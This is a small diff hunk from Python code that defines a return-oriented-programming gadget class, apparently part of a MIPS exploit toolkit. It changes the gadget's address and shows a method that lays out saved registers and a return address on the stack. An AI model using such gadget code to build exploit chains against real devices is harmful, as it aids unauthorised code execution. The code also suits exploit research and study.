@@ -11,7 +11,7 @@ class RestoreA3(ROP_Gadget):
     jr ra
     '''
     def __init__(self):
-        super().__init__(0x4875a, 0x20)
+        super().__init__(0x4815e, 0x20)
 
     def construct_frame(self, ra=0, s0=0, s1=0, s2=0):
         data = [s2, s1, s0, ra]
